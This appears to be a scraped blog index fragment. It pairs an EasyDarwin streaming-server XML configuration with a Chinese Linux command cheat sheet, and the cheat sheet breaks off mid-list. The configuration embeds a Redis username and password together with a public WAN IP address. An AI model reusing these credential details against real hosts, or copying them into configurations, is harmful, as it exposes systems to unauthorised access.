NAME=\"enablebroadcastpush\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enablebroadcastannounce\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"maxbroadcastannouncedurationsecs\" TYPE=\"UInt32\" 0/PREF\n\t\tPREF NAME=\"allowduplicatebroadcasts\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enforcestaticsdpportrange\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"maximumstaticsdpport\" TYPE=\"UInt16\" 65535/PREF\n\t\tPREF NAME=\"minimumstaticsdpport\" TYPE=\"UInt16\" 20000/PREF\n\t\tPREF NAME=\"timeoutstreamSSRCsecs\" TYPE=\"UInt32\" 30/PREF\n\t\tPREF NAME=\"useoneSSRCperstream\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"killclientswhenbroadcaststops\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"reflectorbucketoffsetdelaymsec\" TYPE=\"UInt32\" 73/PREF\n\t\t!-- 控制转发缓存时间 --\n\t\tPREF NAME=\"reflectorbuffersizesec\" TYPE=\"UInt32\" 0/PREF\n\t\tPREF NAME=\"reflectoruseinpacketreceivetime\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"reflectorinpacketmaxreceivesec\" TYPE=\"UInt32\" 60/PREF\n\t\tPREF NAME=\"enablertpplayinfo\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"timeoutbroadcastersessionsecs\" TYPE=\"UInt32\" 20/PREF\n\t\tPREF NAME=\"authenticatelocalbroadcast\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"disableoverbuffering\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"maxannouncedsdplengthkbytes\" TYPE=\"UInt32\" 0/PREF\n\t\tPREF NAME=\"allowbroadcasts\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"redirectbroadcastkeyword\" /PREF\n\t\tPREF NAME=\"redirectbroadcastsdir\" /PREF\n\t\tPREF NAME=\"broadcastdirlist\" /PREF\n\t\tPREF NAME=\"reflectorrtpinfooffsetmsec\" TYPE=\"UInt32\" 500/PREF\n\t\tPREF NAME=\"disablertpplayinfo\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"allowannouncedkill\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enableplayresponserangeheader\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enableplayercompatibility\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"compatibilityadjustsdpmediabandwidthpercent\" TYPE=\"UInt32\" 100/PREF\n\t\tPREF NAME=\"forcertpinfosequenceandtime\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"BroadcasterGroup\" broadcaster/PREF\n\t\tPREF NAME=\"ipallowlist\" 127.0.0./PREF\n\t\t!-- 开启HLS同步输出 --\n\t\tPREF NAME=\"hlsoutputenabled\" TYPE=\"Bool16\" false/PREF\n\t/MODULE\n?xml version =\"1.0\"?\n!-- The Document Type Definition (DTD) for the file --\n\u003c!DOCTYPE CONFIGURATION [\n!ELEMENT CONFIGURATION (SERVER, MODULE)\n!ELEMENT SERVER (PREF|LIST-PREF|OBJECT|LIST-OBJECT)\n!ELEMENT MODULE (PREF|LIST-PREF|OBJECT|LIST-OBJECT)\n\u003c!ATTLIST MODULE\n\tNAME CDATA #REQUIRED  !ELEMENT PREF (#PCDATA)\n\u003c!ATTLIST PREF\n\tNAME CDATA #REQUIRED\n\tTYPE (UInt8|SInt8|UInt16|SInt16|UInt32|SInt32|UInt64|SInt64|Float32|Float64|Bool16|Bool8|char) \"char\"  !ELEMENT LIST-PREF (VALUE)\n!ELEMENT VALUE (#PCDATA)\n\u003c!ATTLIST LIST-PREF\n\tNAME CDATA #REQUIRED\n\tTYPE  (UInt8|SInt8|UInt16|SInt16|UInt32|SInt32|UInt64|SInt64|Float32|Float64|Bool16|Bool8|char) \"char\"  !ELEMENT OBJECT (PREF|LIST-PREF|OBJECT|LIST-OBJECT)\n\u003c!ATTLIST OBJECT\n\tNAME CDATA #REQUIRED  !ELEMENT LIST-OBJECT (OBJECT-VALUE)\n!ELEMENT OBJECT-VALUE (PREF|LIST-PREF|OBJECT|LIST-OBJECT)\n\u003c!ATTLIST LIST-OBJECT\n\tNAME CDATA #REQUIRED  ]  CONFIGURATION\n\tSERVER\n\t\tLIST-PREF NAME=\"rtspport\" TYPE=\"UInt16\" \n\t\t\tVALUE6554/VALUE\n\t\t/LIST-PREF\n\t\tPREF NAME=\"defaultauthorizationrealm\" EasyDarwin/PREF\n\t\tPREF NAME=\"doreporthttpconnectionipaddress\" TYPE=\"Bool16\" disabled/PREF\n\t\tPREF NAME=\"tcpsecondstobuffer\" TYPE=\"Float32\" .5/PREF\n\t\tPREF NAME=\"maxtcpbuffersize\" TYPE=\"UInt32\" 200000/PREF\n\t\tPREF NAME=\"mintcpbuffersize\" TYPE=\"UInt32\" 8192/PREF\n\t\tPREF NAME=\"errorlogging\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"screenlogging\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"errorlogfileverbosity\" TYPE=\"UInt32\" 3/PREF\n\t\tPREF NAME=\"errorlogfilesize\" TYPE=\"UInt32\" 512000/PREF\n\t\tPREF NAME=\"errorlogfileinterval\" TYPE=\"UInt32\" 7/PREF\n\t\tPREF NAME=\"errorlogfiledir\" ./Logs//PREF\n\t\tPREF NAME=\"errorlogfilename\" EasyDarwin/PREF\n\t\tPREF NAME=\"modulefolder\" ./QTSSModules/PREF\n\t\tPREF NAME=\"safeplayduration\" TYPE=\"UInt32\" 600/PREF\n\t\tPREF NAME=\"averagebandwidthupdate\" TYPE=\"UInt32\" 60/PREF\n\t\tPREF NAME=\"totalbytesupdate\" TYPE=\"UInt32\" 15/PREF\n\t\tPREF NAME=\"autorestart\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"breakonassert\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"bindipaddr\" 0/PREF\n\t\t!-- 流媒体文件本地存储的路径，包括点播mp4文件、直播切片生成的hls（m3u8+ts）文件 --\n\t\tPREF NAME=\"moviefolder\" ./Movies//PREF\n\t\tPREF NAME=\"maximumbandwidth\" TYPE=\"SInt32\" 1024000/PREF\n\t\tPREF NAME=\"maximumconnections\" TYPE=\"SInt32\" 10000/PREF\n\t\tPREF NAME=\"rtptimeout\" TYPE=\"UInt32\" 120/PREF\n\t\tPREF NAME=\"realrtsptimeout\" TYPE=\"UInt32\" 30/PREF\n\t\tPREF NAME=\"rtsptimeout\" TYPE=\"UInt32\" 0/PREF\n\t\tPREF NAME=\"runusername\" /PREF\n\t\tPREF NAME=\"rungroupname\" /PREF\n\t\tPREF NAME=\"dropallpacketsdelay\" TYPE=\"SInt32\" 2500/PREF\n\t\tPREF NAME=\"dropallvideodelay\" TYPE=\"SInt32\" 1750/PREF\n\t\tPREF NAME=\"thinallthewaydelay\" TYPE=\"SInt32\" 1500/PREF\n\t\tPREF NAME=\"alwaysthindelay\" TYPE=\"SInt32\" 750/PREF\n\t\tPREF NAME=\"startthinningdelay\" TYPE=\"SInt32\" 0/PREF\n\t\tPREF NAME=\"startthickingdelay\" TYPE=\"SInt32\" 250/PREF\n\t\tPREF NAME=\"thickallthewaydelay\" TYPE=\"SInt32\" -2000/PREF\n\t\tPREF NAME=\"qualitycheckinterval\" TYPE=\"UInt32\" 1000/PREF\n\t\tPREF NAME=\"appendsourceaddrintransport\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"maxretransmitdelay\" TYPE=\"UInt32\" 500/PREF\n\t\tPREF NAME=\"smallwindowsize\" TYPE=\"UInt32\" 24/PREF\n\t\tPREF NAME=\"mediumwindowsize\" TYPE=\"UInt32\" 48/PREF\n\t\tPREF NAME=\"largewindowsize\" TYPE=\"UInt32\" 64/PREF\n\t\tPREF NAME=\"windowsizethreshold\" TYPE=\"UInt32\" 200/PREF\n\t\tPREF NAME=\"windowsizemaxthreshold\" TYPE=\"UInt32\" 1000/PREF\n\t\tPREF NAME=\"ackloggingenabled\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"rtcppollinterval\" TYPE=\"UInt32\" 100/PREF\n\t\tPREF NAME=\"rtcprcvbufsize\" TYPE=\"UInt32\" 768/PREF\n\t\tPREF NAME=\"sendinterval\" TYPE=\"UInt32\" 50/PREF\n\t\tPREF NAME=\"maxsendaheadtime\" TYPE=\"UInt32\" 25/PREF\n\t\tPREF NAME=\"reliableudpslowstart\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"authenticationscheme\" digest/PREF\n\t\tPREF NAME=\"sdpfiledeleteintervalseconds\" TYPE=\"UInt32\" 10/PREF\n\t\tPREF NAME=\"reliableudp\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"reliableudpdirs\" \\/PREF\n\t\tPREF NAME=\"reliableudpprintfs\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"RTSPerrormessage\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"runnumthreads\" TYPE=\"UInt32\" 10/PREF\n\t\tPREF NAME=\"overbufferrate\" TYPE=\"Float32\" 2.0/PREF\n\t\tPREF NAME=\"RTSPdebugprintfs\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enablemonitorstatsfile\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"monitorstatsfileintervalseconds\" TYPE=\"UInt32\" 10/PREF\n\t\tPREF NAME=\"monitorstatsfilename\" serverstatus/PREF\n\t\tPREF NAME=\"enablepacketheaderprintfs\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"packetheaderprintfoptions\" rtp;rr;sr;app;ack;/PREF\n\t\tPREF NAME=\"alttransportsrcipaddr\" /PREF\n\t\tPREF NAME=\"autostart\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"RTSPserverinfo\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"pidfile\" EasyDarwin.pid/PREF\n\t\tPREF NAME=\"forcelogscloseonwrite\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"disablethinning\" TYPE=\"Bool16\" false/PREF\n\t\tLIST-PREF NAME=\"playerrequiresrtpheaderinfo\" \n\t\t\tVALUEAndroid/VALUE\n\t\t\tVALUEIOS/VALUE\n\t\t/LIST-PREF\n\t\tLIST-PREF NAME=\"playerrequiresbandwidthadjustment\" \n\t\t\tVALUEAndroid/VALUE\n\t\t\tVALUEIOS/VALUE\n\t\t/LIST-PREF\n\t\tLIST-PREF NAME=\"playerrequiresnopausetimeadjustment\" \n\t\t\tVALUEAndroid/VALUE\n\t\t\tVALUEIOS/VALUE\n\t\t/LIST-PREF\n\t\tPREF NAME=\"enable3gppprotocol\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enable3gppprotocolrateadaptation\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"3gppprotocolrateadaptationreportfrequency\" TYPE=\"UInt16\" 1/PREF\n\t\tPREF NAME=\"defaultstreamquality\" TYPE=\"UInt16\" 0/PREF\n\t\tPREF NAME=\"playerrequiresrtpstarttimeadjust\" Real/PREF\n\t\tPREF NAME=\"enable3gppdebugprintfs\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"enableudpmonitorstream\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"udpmonitorvideoport\" TYPE=\"UInt16\" 5002/PREF\n\t\tPREF NAME=\"udpmonitoraudioport\" TYPE=\"UInt16\" 5004/PREF\n\t\tPREF NAME=\"udpmonitordestip\" 127.0.0.1/PREF\n\t\tPREF NAME=\"udpmonitorsrcip\" 0.0.0.0/PREF\n\t\tPREF NAME=\"enableallowguestdefault\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"runnumrtspthreads\" TYPE=\"UInt32\" 3/PREF\n\t\tPREF NAME=\"playerrequiresdisable3gpprateadapt\" /PREF\n\t\tPREF NAME=\"playerrequires3gpptargettime\" /PREF\n\t\tPREF NAME=\"3gpptargettimemilliseconds\" TYPE=\"UInt32\" 3000/PREF\n\t\tPREF NAME=\"playerrequiresdisablethinning\" /PREF\n\t\t!-- RESTful服务端口 8080 --\n\t\tPREF NAME=\"httpserviceport\" TYPE=\"UInt16\" 8080/PREF\n\t\tPREF NAME=\"enablecloudplatform\" TYPE=\"Bool16\" true/PREF\n\t/SERVER\n\tMODULE NAME=\"QTSSAccessLogModule\" \n\t\tPREF NAME=\"requestlogfileinterval\" TYPE=\"UInt32\" 7/PREF\n\t\tPREF NAME=\"requestlogfilesize\" TYPE=\"UInt32\" 10240000/PREF\n\t\tPREF NAME=\"requestlogfiledir\" ./Logs/PREF\n\t\tPREF NAME=\"requestlogfilename\" EasyDarwinaccess/PREF\n\t\tPREF NAME=\"requestlogtimeingmt\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"requestlogging\" TYPE=\"Bool16\" true/PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSFileModule\" \n\t\tPREF NAME=\"sdpurl\" /PREF\n\t\tPREF NAME=\"adminemail\" /PREF\n\t\tPREF NAME=\"maxallowedspeed\" TYPE=\"Float32\" 4.000000/PREF\n\t\tPREF NAME=\"flowcontrolprobeinterval\" TYPE=\"UInt32\" 10/PREF\n\t\tPREF NAME=\"enablesharedfilebuffers\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enableprivatefilebuffers\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"numsharedbufferincreasepersession\" TYPE=\"UInt32\" 2/PREF\n\t\tPREF NAME=\"sharedbufferunitksize\" TYPE=\"UInt32\" 32/PREF\n\t\tPREF NAME=\"privatebufferunitksize\" TYPE=\"UInt32\" 32/PREF\n\t\tPREF NAME=\"numsharedbufferunitsperbuffer\" TYPE=\"UInt32\" 0/PREF\n\t\tPREF NAME=\"numprivatebufferunitsperbuffer\" TYPE=\"UInt32\" 1/PREF\n\t\tPREF NAME=\"maxsharedbufferunitsperbuffer\" TYPE=\"UInt32\" 8/PREF\n\t\tPREF NAME=\"maxprivatebufferunitsperbuffer\" TYPE=\"UInt32\" 8/PREF\n\t\tPREF NAME=\"addsecondstoclientbufferdelay\" TYPE=\"Float32\" 0.000000/PREF\n\t\tPREF NAME=\"recordmoviefilesdp\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"enablemoviefilesdp\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"enableplayercompatibility\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"compatibilityadjustsdpmediabandwidthpercent\" TYPE=\"UInt32\" 50/PREF\n\t\tPREF NAME=\"compatibilityadjustrtpstarttimemilli\" TYPE=\"SInt64\" 500/PREF\n\t\tPREF NAME=\"allowinvalidhinttrackrefs\" TYPE=\"Bool16\" false/PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSMP3StreamingModule\" \n\t\tPREF NAME=\"mp3streamingenabled\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"mp3broadcastpassword\"  /PREF\n\t\tPREF NAME=\"mp3broadcastbuffersize\" TYPE=\"UInt32\" 8192/PREF\n\t\tPREF NAME=\"mp3maxflowcontroltime\" TYPE=\"SInt32\" 10000/PREF\n\t\tPREF NAME=\"mp3requestlogfilename\" mp3access/PREF\n\t\tPREF NAME=\"mp3requestlogfiledir\" ./Logs/PREF\n\t\tPREF NAME=\"mp3requestlogging\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"mp3requestlogfilesize\" TYPE=\"UInt32\" 10240000/PREF\n\t\tPREF NAME=\"mp3requestlogfileinterval\" TYPE=\"UInt32\" 7/PREF\n\t\tPREF NAME=\"mp3requestlogtimeingmt\" TYPE=\"Bool16\" true/PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSWebStatsModule\" \n\t\tPREF NAME=\"webstatsurl\" /PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSHttpFileModule\" \n\t\tPREF NAME=\"httpxferenabled\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"httpfolder\" ./http/PREF\n\t\tPREF NAME=\"httplogging\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"httplogfilename\" Http/PREF\n\t\tPREF NAME=\"httplogfiledir\" ./httpLogs/PREF\n\t\tPREF NAME=\"httplogfilesize\" TYPE=\"UInt32\" 256000/PREF\n\t\tPREF NAME=\"httplogfileinterval\" TYPE=\"UInt32\" 7/PREF\n\t/MODULE\n\t!-- 推模式转发 --\n\tMODULE NAME=\"QTSSReflectorModule\" \n\t\tPREF NAME=\"reflectorbucketsize\" TYPE=\"UInt32\" 16/PREF\n\t\tPREF NAME=\"reflectordelay\" TYPE=\"UInt32\" 100/PREF\n\t\tPREF NAME=\"allownonsdpurls\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"enablebroadcastpush\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enablebroadcastannounce\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"maxbroadcastannouncedurationsecs\" TYPE=\"UInt32\" 0/PREF\n\t\tPREF NAME=\"allowduplicatebroadcasts\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enforcestaticsdpportrange\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"maximumstaticsdpport\" TYPE=\"UInt16\" 65535/PREF\n\t\tPREF NAME=\"minimumstaticsdpport\" TYPE=\"UInt16\" 20000/PREF\n\t\tPREF NAME=\"timeoutstreamSSRCsecs\" TYPE=\"UInt32\" 30/PREF\n\t\tPREF NAME=\"useoneSSRCperstream\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"killclientswhenbroadcaststops\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"reflectorbucketoffsetdelaymsec\" TYPE=\"UInt32\" 73/PREF\n\t\t!-- 控制转发缓存时间 --\n\t\tPREF NAME=\"reflectorbuffersizesec\" TYPE=\"UInt32\" 0/PREF\n\t\tPREF NAME=\"reflectoruseinpacketreceivetime\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"reflectorinpacketmaxreceivesec\" TYPE=\"UInt32\" 60/PREF\n\t\tPREF NAME=\"enablertpplayinfo\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"timeoutbroadcastersessionsecs\" TYPE=\"UInt32\" 20/PREF\n\t\tPREF NAME=\"authenticatelocalbroadcast\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"disableoverbuffering\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"maxannouncedsdplengthkbytes\" TYPE=\"UInt32\" 0/PREF\n\t\tPREF NAME=\"allowbroadcasts\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"redirectbroadcastkeyword\" /PREF\n\t\tPREF NAME=\"redirectbroadcastsdir\" /PREF\n\t\tPREF NAME=\"broadcastdirlist\" /PREF\n\t\tPREF NAME=\"reflectorrtpinfooffsetmsec\" TYPE=\"UInt32\" 500/PREF\n\t\tPREF NAME=\"disablertpplayinfo\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"allowannouncedkill\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enableplayresponserangeheader\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enableplayercompatibility\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"compatibilityadjustsdpmediabandwidthpercent\" TYPE=\"UInt32\" 100/PREF\n\t\tPREF NAME=\"forcertpinfosequenceandtime\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"BroadcasterGroup\" broadcaster/PREF\n\t\tPREF NAME=\"ipallowlist\" 127.0.0./PREF\n\t\t!-- 配置QTSSReflectorModule在接收推送的同时，是否同步输出hls流 --\n\t\tPREF NAME=\"hlsoutputenabled\" TYPE=\"Bool16\" false/PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSFlowControlModule\" \n\t\tPREF NAME=\"lossthintolerance\" TYPE=\"UInt32\" 30/PREF\n\t\tPREF NAME=\"numlossestothin\" TYPE=\"UInt32\" 3/PREF\n\t\tPREF NAME=\"lossthicktolerance\" TYPE=\"UInt32\" 5/PREF\n\t\tPREF NAME=\"numlossestothick\" TYPE=\"UInt32\" 6/PREF\n\t\tPREF NAME=\"numworsestothin\" TYPE=\"UInt32\" 2/PREF\n\t\tPREF NAME=\"flowcontroludpthinningmoduleenabled\" TYPE=\"Bool16\" true/PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSRelayModule\" \n\t\tPREF NAME=\"relayprefsfile\" ./relayconfig.xml/PREF\n\t\tPREF NAME=\"relaystatsurl\" /PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSAccessModule\" \n\t\tPREF NAME=\"modAccessqtaccessfilename\" qtaccess/PREF\n\t\tPREF NAME=\"modAccessgroupsfilepath\" ./qtgroups/PREF\n\t\tPREF NAME=\"modAccessusersfilepath\" ./qtusers/PREF\n\t\tPREF NAME=\"modAccessenabled\" TYPE=\"Bool16\" true/PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSAdminModule\" \n\t\tPREF NAME=\"RequestTimeIntervalMilli\" TYPE=\"UInt32\" 50/PREF\n\t\tPREF NAME=\"LocalAccessOnly\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"Authenticate\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"enableremoteadmin\" TYPE=\"Bool16\" true/PREF\n\t\tPREF NAME=\"IPAccessList\" 127.0.0./PREF\n\t\tPREF NAME=\"AdministratorGroup\" admin/PREF\n\t\t!--  后台管理端口默认 8088--\n\t\tPREF NAME=\"httpport\" TYPE=\"UInt16\" 8088/PREF\n\t\tPREF NAME=\"documentroot\" ./html//PREF\n\t/MODULE\n\tMODULE NAME=\"QTSSErrorLogModule\" /MODULE\n\tMODULE NAME=\"QTSSPosixFileSysModule\" /MODULE\n\tMODULE NAME=\"EasyHLSModule\" \n\t\tPREF NAME=\"HTTPROOTDIR\" http://127.0.0.1:80//PREF\n\t\tPREF NAME=\"M3U8VERSION\" TYPE=\"UInt32\" 3/PREF\n\t\tPREF NAME=\"ALLOWCACHE\" TYPE=\"Bool16\" false/PREF\n\t\tPREF NAME=\"TARGETDURATION\" TYPE=\"UInt32\" 4/PREF\n\t\tPREF NAME=\"PLAYLISTCAPACITY\" TYPE=\"UInt32\" 4/PREF\n\t/MODULE\n\tMODULE NAME=\"EasyRelayModule\" \n\t\t!--  配置EasyRelayModule对外服务的ip地址，因为可能会有多网卡或者内网映射，所以需要手动配置 --\n\t\tPREF NAME=\"localipaddress\" 127.0.0.1/PREF\n\t/MODULE\n\tMODULE NAME=\"EasyCMSModule\" /MODULE\n\tMODULE NAME=\"EasyRedisModule\" \n\t\tPREF NAME=\"redisip\" 127.0.0.1/PREF\n\t\tPREF NAME=\"redisport\" TYPE=\"UInt16\" 6379/PREF\n\t\tPREF NAME=\"redisuser\" admin/PREF\n\t\t!--  Redis默认密码 admin --\n\t\tPREF NAME=\"redispassword\" ~ziguangwulian~iguangwulian~guangwulian~uangwulian/PREF\n\t\tPREF NAME=\"rtspwanip\" 121.40.50.44/PREF\n\t\tPREF NAME=\"rtspwanport\" TYPE=\"UInt16\" 6554/PREF\n\t/MODULE\n/CONFIGURATION\n\n`","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 Linux 常见命令","title":"Linux常用命令","text":"Linux常用命令\n\ncolumn -ts , /etc/openvpn/openvpn-status.log\ndpkg -S \"$(readlink -e $(which w))\" | cut -d ':' -f 1\n命令\t描述\n•\tapropos whatis\t显示和word相关的命令。 参见线程安全\n•\tman -t man | ps2pdf -   man.pdf\t生成一个PDF格式的帮助文件\n \twhich command\t显示命令的完整路径名\n \ttime command\t计算命令运行的时间\n•\ttime cat\t开始计时. Ctrl-d停止。参见sw\n•\tnice info\t运行一个低优先级命令（这里是info）\n•\trenice 19 -p $$\t使脚本运行于低优先级。用于非交互任务。\n目录操作\n•\tcd -\t回到前一目录\n•\tcd\t回到用户目录\n \t(cd dir \u0026\u0026 command)\t进入目录dir，执行命令command然后回到当前目录\n•\tpushd .\t将当前目录压入栈，以后你可以使用popd回到此目录\n文件搜索\n•\talias l='ls -l --color=auto'\t单字符文件列表命令\n•\tls -lrt\t按日期显示文件. 参见newest\n•\tls /usr/bin | pr -T9 -W$COLUMNS\t在当前终端宽度上打印9列输出\n \tfind -name '.[ch]' | xargs grep -E 'expr'\t在当前目录及其子目录下所有.c和.h文件中寻找'expr'. 参见findrepo\n \tfind -type f -print0 | xargs -r0 grep -F 'example'\t在当前目录及其子目录中的常规文件中查找字符串'example'\n \tfind -maxdepth 1 -type f | xargs grep -F 'example'\t在当前目录下查找字符串'example'\n \tfind -maxdepth 1 -type d | while read dir; do echo $dir; echo cmd2; done\t对每一个找到的文件执行多个命令(使用while循环)\n•\tfind -type f ! -perm -444\t寻找所有不可读的文件(对网站有用)\n•\tfind -type d ! -perm -111\t寻找不可访问的目录(对网站有用)\n•\tlocate -r 'file\\.txt'\t使用locate 查找所有符合file.txt的文件\n•\tlook reference\t在（有序）字典中快速查找\n•\tgrep --color reference /usr/share/dict/words\t使字典中匹配的正则表达式高亮\n归档 and compression\n \tgpg -c file\t文件加密\n \tgpg file.gpg\t文件解密\n \ttar -c dir/ | bzip2   dir.tar.bz2\t将目录dir/压缩打包\n \tbzip2 -dc dir.tar.bz2 | tar -x\t展开压缩包 (对tar.gz文件使用gzip而不是bzip2)\n \ttar -c dir/ | gzip | gpg -c | ssh user@remote 'dd of=dir.tar.gz.gpg'\t目录dir/压缩打包并放到远程机器上\n \tfind dir/ -name '.txt' | tar -c --files-from=- | bzip2   dirtxt.tar.bz2\t将目录dir/及其子目录下所有.txt文件打包\n \tfind dir/ -name '.txt' | xargs cp -a --target-directory=dirtxt/ --parents\t将目录dir/及其子目录下所有.txt按照目录结构拷贝到dirtxt/\n \t( tar -c /dir/to/copy ) | ( cd /where/to/ \u0026\u0026 tar -x -p )\t拷贝目录copy/到目录/where/to/并保持文件属性\n \t( cd /dir/to/copy \u0026\u0026 tar -c . ) | ( cd /where/to/ \u0026\u0026 tar -x -p )\t拷贝目录copy/下的所有文件到目录/where/to/并保持文件属性\n \t( tar -c /dir/to/copy ) | ssh -C user@remote 'cd /where/to/ \u0026\u0026 tar -x -p' \t拷贝目录copy/到远程目录/where/to/并保持文件属性\n \tdd bs=1M if=/dev/sda | gzip | ssh user@remote 'dd of=sda.gz'\t将整个硬盘备份到远程机器上\nrsync (使用 --dry-run选项进行测试)\n \trsync -P rsync://rsync.server.com/path/to/file file\t只获取diffs.当下载有问题时可以作多次\n \trsync --bwlimit=1000 fromfile tofile\t有速度限制的本地拷贝，对I/O有利\n \trsync -az -e ssh --delete ~/publichtml/ remote.com:'~/publichtml'\t镜像网站(使用压缩和加密)\n \trsync -auz -e ssh remote:/dir/ . \u0026\u0026 rsync -auz -e ssh . remote:/dir/\t同步当前目录和远程目录\nssh (安全 Shell)\n \tssh $USER@$HOST command\t在$Host主机上以$User用户运行命令(默认命令为Shell)\n•\tssh -f -Y $USER@$HOSTNAME xeyes\t在名为$HOSTNAME的主机上以$USER用户运行GUI命令\n \tscp -p -r $USER@$HOST: file dir/\t拷贝到$HOST主机$USER'用户的目录下\n \tssh -g -L 8080:localhost:80 root@$HOST\t由本地主机的8080端口转发到$HOST主机的80端口\n \tssh -R 1434:imap:143 root@$HOST\t由主机的1434端口转发到imap的143端口\nwget (多用途下载工具)\n•\t(cd cmdline \u0026\u0026 wget -nd -pHEKk http://www.pixelbeat.org/cmdline.html)\t在当前目录中下载指定网页及其相关的文件使其可完全浏览\n \twget -c http://www.example.com/large.file\t继续上次未完的下载\n \twget -r -nd -np -l1 -A '.jpg' http://www.example.com/\t批量下载文件到当前目录中\n \twget ftp://remote/file[1-9].iso/\t下载FTP站上的整个目录\n•\twget -q -O- http://www.pixelbeat.org/timeline.html | grep 'a href' | head\t直接处理输出\n \techo 'wget url' | at 01:00\t在下午一点钟下载指定文件到当前目录\n \twget --limit-rate=20k url\t限制下载速度(这里限制到20KB/s)\n \twget -nv --spider --force-html -i bookmarks.html\t检查文件中的链接是否存在\n \twget --mirror http://www.example.com/\t更新网站的本地拷贝(可以方便地用于cron)\n网络(ifconfig, route, mii-tool, nslookup 命令皆已过时)\n \tethtool eth0\t显示网卡eth0的状态\n \tethtool --change eth0 autoneg off speed 100 duplex full\t手动设制网卡速度\n \tiwconfig eth1\t显示无线网卡eth1的状态\n \tiwconfig eth1 rate 1Mb/s fixed\t手动设制无线网卡速度\n•\tiwlist scan\t显示无线网络列表\n•\tip link show\t显示interface列表\n \tip link set dev eth0 name wan\t重命名eth0为wan\n \tip link set dev eth0 up\t启动interface eth0(或关闭)\n•\tip addr show\t显示网卡的IP地址\n \tip addr add 1.2.3.4/24 brd + dev eth0\t添加ip和掩码(255.255.255.0)\n•\tip route show\t显示路由列表\n \tip route add default via 1.2.3.254\t设置默认网关1.2.3.254\n•\ttc qdisc add dev lo root handle 1:0 netem delay 20msec\t增加20ms传输时间到loopback设备(调试用)\n•\ttc qdisc del dev lo root\t移除上面添加的传输时间\n•\thost pixelbeat.org\t查寻主机的DNS IP地址\n•\thostname -i\t查寻本地主机的IP地址(同等于host hostname)\n•\twhois pixelbeat.org\t查寻某主机或莫IP地址的whois信息\n•\tnetstat -tupl\t列出系统中的internet服务\n•\tnetstat -tup\t列出活跃的连接\nwindows networking 